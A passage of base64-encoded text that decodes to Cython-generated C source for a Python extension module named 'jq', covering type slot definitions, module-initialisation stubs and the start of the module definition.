Y29wZV9zdHJ1Y3RfM19nZW5leHByIDwgOCkgJiAoaW50KShQeV9UWVBFKG8pLT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpKSkpIHtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcltfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIrK10gPSAoKHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKilvKTtcbiAgfSBlbHNlXG4gICNlbmRpZlxuICB7XG4gICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICgqUHlfVFlQRShvKS0+dHBfZnJlZSkobyk7XG4gICAgI2Vsc2VcbiAgICB7XG4gICAgICBmcmVlZnVuYyB0cF9mcmVlID0gKGZyZWVmdW5jKVB5VHlwZV9HZXRTbG90KFB5X1RZUEUobyksIFB5X3RwX2ZyZWUpO1xuICAgICAgaWYgKHRwX2ZyZWUpIHRwX2ZyZWUobyk7XG4gICAgfVxuICAgICNlbmRpZlxuICB9XG59XG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG5zdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcl9zbG90c1tdID0ge1xuICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX3B5eF90cF9kZWFsbG9jXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByfSxcbiAge1B5X3RwX25ldywgKHZvaWQgKilfX3B5eF90cF9uZXdfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJ9LFxuICB7MCwgMH0sXG59O1xuc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X3R5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJfc3BlYyA9IHtcbiAgImpxLl9fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIiLFxuICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciksXG4gIDAsXG4gIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLFxuICBfX3B5eF90eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByX3Nsb3RzLFxufTtcbiNlbHNlXG5cbnN0YXRpYyBQeVR5cGVPYmplY3QgX19weXhfdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciA9IHtcbiAgUHlWYXJPYmplY3RfSEVBRF9JTklUKDAsIDApXG4gICJqcS4iIl9fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIiLCBcbiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpLCBcbiAgMCwgXG4gIF9fcHl4X3RwX2RlYWxsb2NfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIsIFxuICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMGI0XG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjRcbiAgMCwgXG4gICNlbmRpZlxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIDAsIFxuICAjZW5kaWZcbiAgMCwgXG4gIDAsIFxuICBfX3B5eF90cF9uZXdfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRVxuICAwLCBcbiAgI2Vsc2VcbiAgTlVMTCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiMSAmJiAoIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzA4MDApXG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCA9PSAxXG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDBcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwYTAwMDBcbiAgMCwgXG4gICNlbmRpZlxufTtcbiNlbmRpZlxuXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWV0aG9kc1tdID0ge1xuICB7MCwgMCwgMCwgMH1cbn07XG5cbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfSW5pdENhY2hlZEJ1aWx0aW5zKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9Jbml0R2xvYmFscyh2b2lkKTsgXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X0luaXRDb25zdGFudHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyBcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF92YXJpYWJsZV9leHBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyBcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9leHBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyBcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF90eXBlX2luaXRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyBcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF90eXBlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9DcmVhdGVDb2RlT2JqZWN0cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyBcblxuXG5zdGF0aWMgaW50IF9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZSIsIDApO1xuICBcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiAwO1xufVxuXG5zdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdmFyaWFibGVfZXhwb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2V4cG9ydF9jb2RlIiwgMCk7XG4gIFxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIDA7XG59XG5cbnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9leHBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfZnVuY3Rpb25fZXhwb3J0X2NvZGUiLCAwKTtcbiAgXG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gMDtcbn1cblxuc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkge1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpO1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlIiwgMCk7XG4gIFxuICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciA9IChQeVR5cGVPYmplY3QgKikgX19QeXhfUHlUeXBlX0Zyb21Nb2R1bGVBbmRTcGVjKF9fcHl4X20sICZfX3B5eF90eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJfc3BlYywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKSkgX19QWVhfRVJSKDAsIDEzMSwgX19weXhfTDFfZXJyb3IpXG4gIGlmIChfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKCZfX3B5eF90eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJfc3BlYywgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzMSwgX19weXhfTDFfZXJyb3IpXG4gICNlbHNlXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciA9ICZfX3B5eF90eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHI7XG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIGlmIChfX1B5eF9QeVR5cGVfUmVhZHkoX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzMSwgX19weXhfTDFfZXJyb3IpXG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgaWYgKChDWVRIT05fVVNFX1RZUEVfU0xPVFMgJiYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQKSAmJiBsaWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwci0+dHBfZGljdG9mZnNldCAmJiBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHItPnRwX2dldGF0dHJvID09IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyKSkge1xuICAgIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cjtcbiAgfVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByID0gKFB5VHlwZU9iamVjdCAqKSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMoX19weXhfbSwgJl9fcHl4X3R5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJfc3BlYywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcikpIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYygmX19weXhfdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcl9zcGVjLCBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzMiwgX19weXhfTDFfZXJyb3IpXG4gICNlbHNlXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgPSAmX19weXhfdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcjtcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgaWYgKF9fUHl4X1B5VHlwZV9SZWFkeShfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzMiwgX19weXhfTDFfZXJyb3IpXG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgaWYgKChDWVRIT05fVVNFX1RZUEVfU0xPVFMgJiYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQKSAmJiBsaWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHItPnRwX2RpY3RvZmZzZXQgJiYgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7XG4gICAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cjtcbiAgfVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByID0gKFB5VHlwZU9iamVjdCAqKSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMoX19weXhfbSwgJl9fcHl4X3R5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJfc3BlYywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcikpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYygmX19weXhfdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl9zcGVjLCBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDFfZXJyb3IpXG4gICNlbHNlXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgPSAmX19weXhfdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcjtcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgaWYgKF9fUHl4X1B5VHlwZV9SZWFkeShfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDFfZXJyb3IpXG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgaWYgKChDWVRIT05fVVNFX1RZUEVfU0xPVFMgJiYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQKSAmJiBsaWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHItPnRwX2RpY3RvZmZzZXQgJiYgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7XG4gICAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cjtcbiAgfVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByID0gKFB5VHlwZU9iamVjdCAqKSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMoX19weXhfbSwgJl9fcHl4X3R5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJfc3BlYywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikpIF9fUFlYX0VSUigwLCA0MjQsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYygmX19weXhfdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcl9zcGVjLCBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDFfZXJyb3IpXG4gICNlbHNlXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgPSAmX19weXhfdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcjtcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgaWYgKF9fUHl4X1B5VHlwZV9SZWFkeShfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDFfZXJyb3IpXG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgaWYgKChDWVRIT05fVVNFX1RZUEVfU0xPVFMgJiYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQKSAmJiBsaWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHItPnRwX2RpY3RvZmZzZXQgJiYgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7XG4gICAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cjtcbiAgfVxuICAjZW5kaWZcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiAwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gLTE7XG59XG5cbnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF90eXBlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkge1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfbW9kaW5pdF90eXBlX2ltcG9ydF9jb2RlIiwgMCk7XG4gIFxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIDA7XG59XG5cbnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF92YXJpYWJsZV9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfdmFyaWFibGVfaW1wb3J0X2NvZGUiLCAwKTtcbiAgXG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gMDtcbn1cblxuc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkge1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9pbXBvcnRfY29kZSIsIDApO1xuICBcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiAwO1xufVxuXG4jaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG5zdGF0aWMgUHlPYmplY3QqIF9fcHl4X3B5bW9kX2NyZWF0ZShQeU9iamVjdCAqc3BlYywgUHlNb2R1bGVEZWYgKmRlZik7IFxuc3RhdGljIGludCBfX3B5eF9weW1vZF9leGVjX2pxKFB5T2JqZWN0KiBtb2R1bGUpOyBcbnN0YXRpYyBQeU1vZHVsZURlZl9TbG90IF9fcHl4X21vZHVsZWRlZl9zbG90c1tdID0ge1xuICB7UHlfbW9kX2NyZWF0ZSwgKHZvaWQqKV9fcHl4X3B5bW9kX2NyZWF0ZX0sXG4gIHtQeV9tb2RfZXhlYywgKHZvaWQqKV9fcHl4X3B5bW9kX2V4ZWNfanF9LFxuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiAge1B5X21vZF9naWwsIFB5X01PRF9HSUxfVVNFRH0sXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMCAmJiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICB7UHlfbW9kX211bHRpcGxlX2ludGVycHJldGVycywgUHlfTU9EX01VTFRJUExFX0lOVEVSUFJFVEVSU19OT1RfU1VQUE9SVEVEfSxcbiAgI2VuZGlmXG4gIHswLCBOVUxMfVxufTtcbiNlbmRpZlxuXG4jaWZkZWYgX19jcGx1c3BsdXNcbm5hbWVzcGFjZSB7XG4gIHN0cnVjdCBQeU1vZHVsZURlZiBfX3B5eF9tb2R1bGVkZWYgPVxuICAjZWxzZVxuICBzdGF0aWMgc3RydWN0IFB5TW9kdWxlRGVmIF9fcHl4X21vZHVsZWRlZiA9XG4gICNlbmRpZlxuICB7XG4gICAgICBQeU1vZHVsZURlZl9IRUFEX0lOSVQsXG4gICAgICAianEiLFxuICAgICAgMCwgXG4gICAgI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4gICAgICBzaXplb2YoX19weXhfbXN0YXRldHlwZSksIFxuICAgICNlbHNlXG4gICAgICAoQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUKSA/IDAgOiAtMSwgXG4gICAgI2VuZGlmXG4gICAgICBfX3B5eF9tZXRob2RzICxcbiAgICAjaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gICAgICBfX3B5eF9tb2R1bGVkZWZ